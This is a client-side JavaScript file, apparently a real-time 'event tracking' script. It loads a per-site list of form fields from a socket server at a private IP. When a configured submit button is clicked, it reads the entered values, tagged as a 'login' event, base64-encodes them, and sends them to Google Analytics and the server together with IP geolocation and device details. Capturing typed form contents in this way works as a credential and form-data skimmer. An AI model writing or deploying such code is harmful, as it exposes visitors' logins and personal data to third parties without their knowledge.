// Connect Socket For Get Real Time Data
var socket = io.connect('http://192.168.88.23:8080');
// Configure Variables
var osConfig = [{
    name: 'Windows Phone',
    value: 'Windows Phone',
    version: 'OS'
}, {
    name: 'Windows',
    value: 'Win',
    version: 'NT'
}, {
    name: 'iPhone',
    value: 'iPhone',
    version: 'OS'
}, {
    name: 'iPad',
    value: 'iPad',
    version: 'OS'
}, {
    name: 'Kindle',
    value: 'Silk',
    version: 'Silk'
}, {
    name: 'Android',
    value: 'Android',
    version: 'Android'
}, {
    name: 'PlayBook',
    value: 'PlayBook',
    version: 'OS'
}, {
    name: 'BlackBerry',
    value: 'BlackBerry',
    version: '/'
}, {
    name: 'Macintosh',
    value: 'Mac',
    version: 'OS X'
}, {
    name: 'Linux',
    value: 'Linux',
    version: 'rv'
}, {
    name: 'Palm',
    value: 'Palm',
    version: 'PalmOS'
}];
var browserConfig = [{
    name: 'Chrome',
    value: 'Chrome',
    version: 'Chrome'
}, {
    name: 'Firefox',
    value: 'Firefox',
    version: 'Firefox'
}, {
    name: 'Safari',
    value: 'Safari',
    version: 'Version'
}, {
    name: 'Internet Explorer',
    value: 'MSIE',
    version: 'MSIE'
}, {
    name: 'Opera',
    value: 'Opera',
    version: 'Opera'
}, {
    name: 'BlackBerry',
    value: 'CLDC',
    version: 'CLDC'
}, {
    name: 'Mozilla',
    value: 'Mozilla',
    version: 'Mozilla'
}];

var header = [
    navigator.platform,
    navigator.userAgent,
    navigator.appVersion,
    navigator.vendor,
    window.opera
];
/* Configuration Object for Event Tracking */
var configuration,
    eventFlag = true;

/* Socket Connected Event */
socket.on('connect', function () {
    /* Create Real Time Connection */
    if (!_inIframe())
        _getInputConfiguration();
});

document.onclick = function (event) {
    if (event === undefined) event = window.event;
    var target = 'target' in event ? event.target : event.srcElement;

    if (_inIframe()) {
        _sendConfiguration(event.target);
    } else if (configuration) {
        var userInfo = {};
        var submitIds = configuration.map(function (obj) {
            return obj.submitId.elementId;
        });
        var submitXpaths = configuration.map(function (obj) {
            return obj.submitId.elementXPath;
        });
        var eventTargetXpath = _findXpathOfElement(event.target);
        if ((submitIds.indexOf(event.target.getAttribute("id")) > -1 || submitXpaths.indexOf(eventTargetXpath) > -1) && eventFlag) {
            if (submitIds.indexOf(event.target.getAttribute("id")) > -1)
                formIndex = submitIds.indexOf(event.target.getAttribute("id"));
            else if (submitXpaths.indexOf(eventTargetXpath) > -1)
                formIndex = submitXpaths.indexOf(eventTargetXpath);
            eventFlag = false;
            configuration[formIndex].inputIds.forEach(function (inputIdValue) {
                if (inputIdValue.elementId)
                    userInfo[inputIdValue.elementId] = document.getElementById(inputIdValue.elementId).value;
                else if (inputIdValue.elementXPath)
                    userInfo[inputIdValue.elementXPath] = _getElementByXPath(inputIdValue.elementXPath).value;
            });
            dataToSend(userInfo, 'login');
        }
    }
};

function dataToSend(userInfo, eventName) {
    var userInfoData = {
        userInfo: userInfo,
        id: socket.id
    }
    userInfoData = JSON.stringify(userInfoData);
    var data = CryptoJS.enc.Utf8.parse(userInfoData);
    data = CryptoJS.enc.Base64.stringify(data);
    ga('send', 'event', eventName || 'clickEvent', data);
    _createAndSendClientInfo('goal-done', eventName, data)
}

function _matchItem(data) {
    var agent = header.join(' ');
    var i = 0,
        j = 0,
        html = '',
        regex,
        regexv,
        match,
        matches,
        version;
    for (i = 0; i < data.length; i += 1) {
        regex = new RegExp(data[i].value, 'i');
        match = regex.test(agent);
        if (match) {
            regexv = new RegExp(data[i].version + '[- /:;]([\\d._]+)', 'i');
            matches = agent.match(regexv);
            version = '';
            if (matches) {
                if (matches[1]) {
                    matches = matches[1];
                }
            }
            if (matches) {
                matches = matches.split(/[._]+/);
                for (j = 0; j < matches.length; j += 1) {
                    if (j === 0) {
                        version += matches[j] + '.';
                    } else {
                        version += matches[j];
                    }
                }
            } else {
                version = '0';
            }
            return {
                name: data[i].name,
                version: parseFloat(version)
            };
        }
    }
    return {
        name: 'unknown',
        version: 0
    };
}

function _connectToGA() {
    if (!localStorage.getItem('userClientId')) {
        var randomNumber = (Math.floor(100000 + Math.random() * 900000)).toString();
        localStorage.setItem('userClientId', randomNumber);
        ga('send', 'event', 'onload', randomNumber);
    } else {
        ga('send', 'event', 'onload', localStorage.getItem('userClientId'));
    }
}

function _createAndSendClientInfo(connectionState, eventName, userData) {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            var clientInfo = Object.assign({}, JSON.parse(xhttp.responseText));
            clientInfo.os = _matchItem(osConfig).name;
            clientInfo.browser = _matchItem(browserConfig).name;
            clientInfo.eventName = eventName;
            clientInfo.userData = userData;
            clientInfo.device = _detectDevice();
            clientInfo.host = window.location.hostname;
            socket.emit(connectionState, clientInfo);
        }
    };
    xhttp.open("GET", "https://ipapi.co/json/", true);
    xhttp.send();
}

function _detectDevice() {
    var ua = navigator.userAgent;
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|mobile|CriOS/i.test(ua))
        return 'Mobile';
    else
        return 'Desktop';
}

function _sendConfiguration(element) {
    console.log(element.id)
    socket.emit('send-configuration', {
        elementId: element.id,
        elementXPath: _findXpathOfElement(element),
    });
}

function _findXpathOfElement(element) {
    var paths = [];
    for (; element && element.nodeType == Node.ELEMENT_NODE;
        element = element.parentNode) {
        var index = 0;
        var hasFollowingSiblings = false;
        for (var sibling = element.previousSibling; sibling;
            sibling = sibling.previousSibling) {
            if (sibling.nodeType == Node.DOCUMENT_TYPE_NODE)
                continue;
            if (sibling.nodeName == element.nodeName)
                ++index;
        }
        for (var sibling = element.nextSibling;
            sibling && !hasFollowingSiblings;
            sibling = sibling.nextSibling) {
            if (sibling.nodeName == element.nodeName)
                hasFollowingSiblings = true;
        }
        var tagName = (element.prefix ? element.prefix + ":" : "")
            + element.localName;
        var pathIndex = (index || hasFollowingSiblings ? "["
            + (index + 1) + "]" : "");
        paths.splice(0, 0, tagName + pathIndex);
    }
    return paths.length ? "/" + paths.join("/") : null;
}

function _getElementByXPath(xpath) {
    return document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
}


function _getInputConfiguration() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            if (JSON.parse(xhttp.responseText).successMessage) {
                if (JSON.parse(xhttp.responseText).data && JSON.parse(xhttp.responseText).data.length > 0) {
                    configuration = JSON.parse(xhttp.responseText).data[0].site_configuration;
                    _createAndSendClientInfo('connect-state', 'onload', socket.id);
                    _connectToGA();
                }

            } else {
                console.log(JSON.parse(xhttp.responseText))
            }
        }
    };
    xhttp.open("POST", "http://192.168.88.23:8080/getInputConfiguration", true);
    xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhttp.send(JSON.stringify({
        host: window.location.hostname
    }));
}

function _inIframe() {
    try {
        return window.self !== window.top;
    } catch (e) {
        return true;
    }
}
